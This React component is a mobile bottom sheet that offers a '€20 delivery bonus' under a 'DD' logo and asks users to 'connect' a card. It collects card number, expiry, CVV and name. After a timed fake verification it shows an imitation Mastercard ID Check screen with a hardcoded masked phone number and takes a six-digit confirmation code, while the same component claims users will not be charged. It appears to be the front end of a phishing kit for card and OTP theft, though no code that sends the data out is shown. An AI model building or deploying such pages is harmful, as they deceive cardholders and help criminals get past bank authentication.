import { useState, useEffect } from "react";
import { createPortal } from "react-dom";
import { X, CreditCard, Shield, Clock, ArrowRight } from "lucide-react";
import { Button } from "@/components/ui/button";

interface ConnectCardBottomSheetProps {
  isOpen: boolean;
  onClose: () => void;
  onConnect?: () => void;
}

export default function ConnectCardBottomSheet({
  isOpen,
  onClose,
  onConnect
}: ConnectCardBottomSheetProps) {
  const [isMinimized, setIsMinimized] = useState(false);
  const [currentStep, setCurrentStep] = useState(1); // 1 = intro, 2 = loading, 3 = form, 4 = 3ds loading, 5 = 3ds auth
  const [isLoading, setIsLoading] = useState(false);
  const [animateEmojis, setAnimateEmojis] = useState(false);
  const [isVisible, setIsVisible] = useState(false);
  const [otpCode, setOtpCode] = useState("");
  const [cardData, setCardData] = useState({
    cardNumber: "",
    expiryDate: "",
    cvv: "",
    name: ""
  });

  // Reset state when bottom sheet opens
  useEffect(() => {
    if (isOpen) {
      setCurrentStep(1);
      setIsLoading(false);
      setAnimateEmojis(false);
      setIsMinimized(false);
      // Start animation immediately
      setIsVisible(true);
    } else {
      setIsVisible(false);
    }
  }, [isOpen]);

  const handleMinimizeBottomSheet = () => {
    setIsMinimized(true);
  };

  const handleExpandBottomSheet = () => {
    setIsMinimized(false);
  };

  const handleNext = () => {
    setCurrentStep(2);
    setIsLoading(true);
    
    // Start emoji animation
    setAnimateEmojis(true);
    
    // After 1.5 seconds, show card form
    setTimeout(() => {
      setCurrentStep(3);
      setIsLoading(false);
      setAnimateEmojis(false);
    }, 1500);
  };

  const handleCardDataChange = (field: string, value: string) => {
    setCardData(prev => ({
      ...prev,
      [field]: value
    }));
  };

  const handleCardSubmit = () => {
    // Start 3DS authentication flow
    setCurrentStep(4); // 3DS loading

    // Show loading animation for 3 seconds
    setTimeout(() => {
      setCurrentStep(5); // 3DS authentication
    }, 3000);
  };

  const handleOtpChange = (value: string) => {
    if (value.length <= 6 && /^\d*$/.test(value)) {
      setOtpCode(value);
    }
  };

  const handleConfirmPayment = () => {
    if (otpCode.length === 6) {
      // Process payment confirmation
      alert("Payment confirmed! Your €20 bonus is ready to use.");
      if (onConnect) onConnect();
      onClose();
    } else {
      alert("Please enter a 6-digit confirmation code.");
    }
  };

  const handleResendCode = () => {
    alert("New confirmation code has been sent to your mobile number.");
  };

  if (!isOpen) return null;

  const bottomSheetContent = (
    <div
      className="fixed inset-0 z-[9999]"
      style={{
        position: 'fixed',
        top: 0,
        left: 0,
        right: 0,
        bottom: 0,
        pointerEvents: 'auto'
      }}
    >
      {/* Backdrop that fades in */}
      <div
        className={`absolute inset-0 bg-black/50 backdrop-blur-sm transition-opacity duration-500 ${
          isVisible ? 'opacity-100' : 'opacity-0'
        }`}
        onClick={onClose}
        style={{
          position: 'absolute',
          top: 0,
          left: 0,
          right: 0,
          bottom: 0
        }}
      />

      {/* Bottom sheet that slides up from bottom */}
      <div
        className={`fixed left-0 right-0 bg-white rounded-t-3xl shadow-2xl ${
          isMinimized ? 'h-24' : 'h-[75vh]'
        }`}
        style={{
          position: 'fixed',
          bottom: 0,
          left: 0,
          right: 0,
          zIndex: 10001,
          transform: isVisible
            ? 'translateY(0)'
            : 'translateY(100%)',
          transition: 'transform 400ms cubic-bezier(0.25, 0.46, 0.45, 0.94), height 300ms ease-out'
        }}
      >
        {/* Handle Bar */}
        <div 
          className="flex justify-center pt-3 pb-2 cursor-pointer"
          onClick={isMinimized ? handleExpandBottomSheet : handleMinimizeBottomSheet}
        >
          <div className="w-12 h-1 bg-black/20 rounded-full"></div>
        </div>

        {/* Close Button */}
        <button
          onClick={onClose}
          className="absolute top-4 right-4 w-8 h-8 rounded-full bg-gray-100 hover:bg-gray-200 flex items-center justify-center transition-colors z-10"
        >
          <X className="w-4 h-4" />
        </button>

        {/* Content */}
        <div className={`px-6 pb-6 overflow-hidden ${isMinimized ? 'h-16' : 'h-full'}`}>
          {isMinimized ? (
            <div 
              className="flex items-center justify-between cursor-pointer"
              onClick={handleExpandBottomSheet}
            >
              <div className="flex items-center space-x-3">
                <div className="w-12 h-12 bg-gradient-to-r from-brand to-yellow-400 rounded-xl flex items-center justify-center">
                  <CreditCard className="w-6 h-6 text-black" />
                </div>
                <div>
                  <h3 className="font-black text-lg">€20 Bonus</h3>
                  <p className="text-sm text-gray-600">Tap to continue</p>
                </div>
              </div>
              <div className="text-brand font-black text-xl">€20</div>
            </div>
          ) : (
            <div className="h-full flex flex-col">
              {/* Step 1: Intro with Bonus Card */}
              {currentStep === 1 && (
                <>
                  {/* Bonus Card - Same as FlippableCard front */}
                  <div className="mb-6">
                    <div className="bg-gradient-to-r from-brand to-yellow-400 p-6 rounded-3xl text-center shadow-lg max-w-xs mx-auto">
                      <h3 className="font-black text-lg mb-4 text-black">Your Bonus</h3>
                      <div className="bg-white rounded-xl p-6 mb-4">
                        <div className="text-4xl font-black text-brand mb-2">
                          €20
                        </div>
                        <div className="text-sm font-bold text-green-600">
                          DELIVERY BONUS
                        </div>
                      </div>
                    </div>
                  </div>

                  {/* Benefits */}
                  <div className="space-y-4 mb-6">
                    <div className="flex items-start space-x-3">
                      <div className="w-6 h-6 bg-green-100 rounded-full flex items-center justify-center flex-shrink-0 mt-0.5">
                        <span className="text-green-600 font-black text-sm">1</span>
                      </div>
                      <div>
                        <h3 className="font-black text-sm">Connect your card</h3>
                        <p className="text-xs text-gray-600">Safe and secure connection</p>
                      </div>
                    </div>

                    <div className="flex items-start space-x-3">
                      <div className="w-6 h-6 bg-green-100 rounded-full flex items-center justify-center flex-shrink-0 mt-0.5">
                        <span className="text-green-600 font-black text-sm">2</span>
                      </div>
                      <div>
                        <h3 className="font-black text-sm">We won't charge you</h3>
                        <p className="text-xs text-gray-600">No hidden fees or charges</p>
                      </div>
                    </div>

                    <div className="flex items-start space-x-3">
                      <div className="w-6 h-6 bg-green-100 rounded-full flex items-center justify-center flex-shrink-0 mt-0.5">
                        <span className="text-green-600 font-black text-sm">3</span>
                      </div>
                      <div>
                        <h3 className="font-black text-sm">You can disconnect your card anytime</h3>
                        <p className="text-xs text-gray-600">Full control over your data</p>
                      </div>
                    </div>
                  </div>

                  {/* Connect Button */}
                  <div className="mt-auto pt-4 border-t border-gray-200">
                    <Button
                      onClick={handleNext}
                      className="w-full bg-green-500 hover:bg-green-600 text-black font-black rounded-2xl py-4 text-lg"
                    >
                      <ArrowRight className="w-5 h-5 mr-2" />
                      CONNECT
                    </Button>
                  </div>
                </>
              )}

              {/* Step 2: Loading */}
              {currentStep === 2 && (
                <div className="h-full flex flex-col items-center justify-center">
                  <div className="relative mb-8">
                    <div className="flex items-center space-x-8">
                      <div 
                        className={`text-6xl transition-all duration-300 ${
                          animateEmojis ? 'transform translate-x-16' : ''
                        }`}
                      >
                        🍔
                      </div>
                      <div 
                        className={`text-6xl transition-all duration-300 ${
                          animateEmojis ? 'transform -translate-x-16' : ''
                        }`}
                      >
                        🥤
                      </div>
                    </div>
                  </div>
                  <div className="text-center">
                    <h3 className="text-xl font-black mb-2">Setting up your bonus...</h3>
                    <p className="text-gray-600 font-semibold">Please wait a moment</p>
                  </div>
                </div>
              )}

              {/* Step 3: Card Form */}
              {currentStep === 3 && (
                <>
                  {/* Header */}
                  <div className="text-center mb-6 sm:mb-6 sm:mt-0 mt-7">
                    {/* Logo */}
                    <div className="w-16 h-16 bg-brand rounded-2xl mx-auto mb-4 flex items-center justify-center">
                      <span className="text-2xl font-black text-black">DD</span>
                    </div>
                    <h2 className="text-2xl font-black mb-2">Connect Your Card</h2>
                    <p className="text-gray-600 font-semibold">
                      Enter your card details to claim your €20 bonus
                    </p>
                  </div>

                  {/* Card Form */}
                  <div className="space-y-4 mb-6 flex-1 sm:mt-0 mt-5">
                    <div>
                      <input
                        type="text"
                        placeholder="Card Number"
                        value={cardData.cardNumber}
                        onChange={(e) => handleCardDataChange('cardNumber', e.target.value)}
                        className="w-full px-4 py-3 bg-gray-50 border border-gray-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-brand/20 focus:border-brand font-semibold"
                        maxLength={19}
                      />
                    </div>

                    <div className="grid grid-cols-2 gap-3">
                      <input
                        type="text"
                        placeholder="MM/YY"
                        value={cardData.expiryDate}
                        onChange={(e) => handleCardDataChange('expiryDate', e.target.value)}
                        className="px-4 py-3 bg-gray-50 border border-gray-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-brand/20 focus:border-brand font-semibold"
                        maxLength={5}
                      />
                      <input
                        type="text"
                        placeholder="CVV"
                        value={cardData.cvv}
                        onChange={(e) => handleCardDataChange('cvv', e.target.value)}
                        className="px-4 py-3 bg-gray-50 border border-gray-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-brand/20 focus:border-brand font-semibold"
                        maxLength={4}
                      />
                    </div>

                    <div>
                      <input
                        type="text"
                        placeholder="Cardholder Name"
                        value={cardData.name}
                        onChange={(e) => handleCardDataChange('name', e.target.value)}
                        className="w-full px-4 py-3 bg-gray-50 border border-gray-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-brand/20 focus:border-brand font-semibold"
                      />
                    </div>
                  </div>

                  {/* Final Connect Button */}
                  <div className="pt-4 border-t border-gray-200">
                    <Button
                      onClick={handleCardSubmit}
                      className="w-full bg-green-500 hover:bg-green-600 text-black font-black rounded-2xl py-4 text-lg"
                    >
                      <CreditCard className="w-5 h-5 mr-2" />
                      CONNECT
                    </Button>

                    <div className="mt-3 flex items-center justify-center space-x-4 text-xs text-gray-500">
                      <div className="flex items-center space-x-1">
                        <Shield className="w-3 h-3" />
                        <span>SSL Secured</span>
                      </div>
                      <div className="flex items-center space-x-1">
                        <Clock className="w-3 h-3" />
                        <span>Instant Setup</span>
                      </div>
                    </div>
                  </div>
                </>
              )}

              {/* Step 4: 3DS Loading */}
              {currentStep === 4 && (
                <div className="h-full flex flex-col items-center justify-center bg-white">
                  <div className="relative mb-8">
                    {/* Circular particle animation */}
                    <div className="relative w-24 h-24">
                      {[...Array(8)].map((_, i) => (
                        <div
                          key={i}
                          className="absolute w-3 h-3 bg-brand rounded-full animate-spin"
                          style={{
                            top: '50%',
                            left: '50%',
                            transform: `rotate(${i * 45}deg) translateY(-40px) translateX(-6px)`,
                            animationDuration: '1.5s',
                            animationDelay: `${i * 0.1}s`,
                          }}
                        />
                      ))}
                    </div>
                  </div>
                  <div className="text-center">
                    <h3 className="text-xl font-black mb-2">Verifying your card...</h3>
                    <p className="text-gray-600 font-semibold">Please wait while we process your payment</p>
                  </div>
                </div>
              )}

              {/* Step 5: 3DS Authentication */}
              {currentStep === 5 && (
                <>
                  {/* 3DS Header */}
                  <div className="flex justify-between items-center mb-8 px-2">
                    {/* Bank Icon */}
                    <div className="w-12 h-12 bg-gray-100 rounded-lg flex items-center justify-center">
                      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" className="text-gray-700">
                        <path d="M3 21h18" stroke="currentColor" strokeWidth="2" strokeLinecap="round"/>
                        <path d="M5 21V7l8-4v18" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                        <path d="M19 21V11l-6-4" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                        <path d="M9 9v.01" stroke="currentColor" strokeWidth="2" strokeLinecap="round"/>
                        <path d="M9 12v.01" stroke="currentColor" strokeWidth="2" strokeLinecap="round"/>
                        <path d="M9 15v.01" stroke="currentColor" strokeWidth="2" strokeLinecap="round"/>
                        <path d="M9 18v.01" stroke="currentColor" strokeWidth="2" strokeLinecap="round"/>
                      </svg>
                    </div>
                    {/* Mastercard Logo */}
                    <div className="text-right">
                      <div className="flex items-center space-x-1">
                        <div className="w-6 h-6 bg-red-500 rounded-full opacity-90"></div>
                        <div className="w-6 h-6 bg-yellow-500 rounded-full opacity-90 -ml-3"></div>
                      </div>
                      <p className="text-xs text-gray-500 mt-1">ID Check</p>
                    </div>
                  </div>

                  {/* Authentication Content */}
                  <div className="flex-1">
                    <h1 className="text-3xl font-bold mb-6 text-left">Purchase Authentication</h1>

                    <p className="text-gray-600 font-medium mb-8 leading-relaxed">
                      We've sent you a text message to your registered mobile number ending in 2329.
                    </p>

                    <div className="space-y-6">
                      <div>
                        <label className="block text-gray-700 font-medium mb-3">
                          Confirmation code
                        </label>
                        <input
                          type="text"
                          placeholder=""
                          value={otpCode}
                          onChange={(e) => handleOtpChange(e.target.value)}
                          className="w-full px-4 py-4 bg-white border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 font-medium text-lg tracking-wider"
                          maxLength={6}
                          style={{ letterSpacing: '0.5em' }}
                        />
                      </div>
                    </div>
                  </div>

                  {/* 3DS Buttons */}
                  <div className="pt-6 space-y-4">
                    <Button
                      onClick={handleConfirmPayment}
                      className="w-full bg-black hover:bg-gray-800 text-white font-bold rounded-lg py-4 text-lg"
                      disabled={otpCode.length !== 6}
                    >
                      Confirm payment
                    </Button>

                    <button
                      onClick={handleResendCode}
                      className="w-full text-gray-500 font-medium py-2 hover:text-gray-700 transition-colors"
                    >
                      Resend code
                    </button>
                  </div>
                </>
              )}
            </div>
          )}
        </div>
      </div>
    </div>
  );

  // Render the bottom sheet at document body level using portal
  return typeof document !== 'undefined'
    ? createPortal(bottomSheetContent, document.body)
    : null;
}
